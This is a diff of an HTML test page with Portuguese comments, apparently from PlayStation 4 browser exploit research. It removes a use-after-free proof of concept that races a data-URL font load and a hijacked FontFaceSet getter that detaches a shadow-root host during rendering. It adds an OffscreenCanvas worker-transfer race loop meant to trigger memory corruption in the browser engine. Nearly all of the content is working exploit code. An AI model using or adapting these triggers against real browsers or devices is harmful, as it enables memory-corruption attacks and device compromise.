@@ -7,79 +7,39 @@
     <script src="https://cdn.jsdelivr.net/npm/eruda"></script>
     <script>eruda.init();</script>
 <script>
-// UAF via host.remove() durante rendering de shadow root
-//
-// Mecanismo confirmado:
-//   100KB data URL → opportunisticallyStartFontDataURLLoading (PS4 sincrono)
-//   → font carrega durante glyph walk do rendering
-//   → FontFace.loaded → FontFaceSet.prototype.then → getter dispara
-//   → DURANTE o rendering ativo do shadow root
-//
-// Se host.remove() durante rendering causa UAF:
-//   O renderer ainda tem ponteiros para o shadow root / RenderObject
-//   host.remove() → desanexa o node e invalida os render objects
-//   Rendering continua com objetos potencialmente liberados → UAF
-
-function log(s) { document.getElementById('log').textContent += s + '\n'; }
-
-document.fonts;
-
-// 100KB — confirmado que dispara getter durante rendering no PS4
-var pendingUrl = 'url("data:font/woff;base64,' + 'A'.repeat(100000) + '")';
-
-function run() {
-    var host = document.createElement('div');
-    document.body.appendChild(host);
-    var shadowRoot = host.attachShadow({ mode: 'open' });
-
-    var fontFaceStyle = document.createElement('style');
-    fontFaceStyle.textContent =
-        '@font-face { font-family: reentryFont; src: ' + pendingUrl + '; }' +
-        '.probe { font: 24px reentryFont; }';
-    shadowRoot.appendChild(fontFaceStyle);
-
-    var probe = document.createElement('span');
-    probe.className = 'probe';
-    probe.textContent = 'A';
-    shadowRoot.appendChild(probe);
-
-    void document.body.offsetHeight;
-    log('status: ' + document.fonts.status);
-    document.fonts.load('24px reentryFont', 'A');
-    void document.fonts.ready;
-
-    var prependedStyle = document.createElement('style');
-    prependedStyle.textContent = '.x { color: blue; }';
-    shadowRoot.prepend(prependedStyle);
-
-    var getterCount = 0;
-    Object.defineProperty(FontFaceSet.prototype, 'then', {
-        configurable: true,
-        get: function() {
-            delete FontFaceSet.prototype.then;
-            getterCount++;
-            log('[GETTER] disparou durante rendering — chamando host.remove()');
-            // Remover o host enquanto o renderer esta processando o shadow root
-            // O glyph walk ainda esta ativo na call stack C++
-            // RenderObject do shadow root pode estar com dangling pointer
-            host.remove();
-            return undefined;
-        }
-    });
-
-    log('getter instalado — aguardando rendering...');
-
-    setTimeout(function() {
-        log('getter count: ' + getterCount);
-        if (getterCount === 0)
-            log('getter nao disparou');
-        log('PASS se chegou aqui sem crash');
-    }, 500);
+function runOffscreenCanvasTransferRace() {
+            log("[C++] Iniciando OffscreenCanvas TransferControl + Proxy GC Race...");
+            const workerCode = `
+                onmessage = (e) => {
+                    if (e.data && e.data.canvas) {
+                        postMessage({ack: true}, [e.data.canvas]);
+                    }
+                };
+            `;
+            const url = URL.createObjectURL(new Blob([workerCode], {type: "text/javascript"}));
+            
+            let count = 0;
+            const interval = setInterval(() => {
+                const w = new Worker(url);
+                const canvas = new OffscreenCanvas(128, 128);
+                const transferred = canvas.transferToImageBitmap ? canvas.transferToImageBitmap() : canvas;
+                
+                try {
+                    w.postMessage({canvas: transferred}, [transferred]);
+                } catch(e) {}
+                
+                setTimeout(() => {
+                    w.terminate();
+                }, 7 + Math.random() * 13);
+                
+                count++;
+                if (count % 65 === 0) log(`OffscreenCanvas races: ${count}`);
+                if (count > 800) {
+                    clearInterval(interval);
+                    log("Teste 4 finalizado.");
+                }
+            }, 13);
 }
-
-window.addEventListener('load', function() {
-    setTimeout(run, 0);
-});
 </script>
 </body>
 </html>
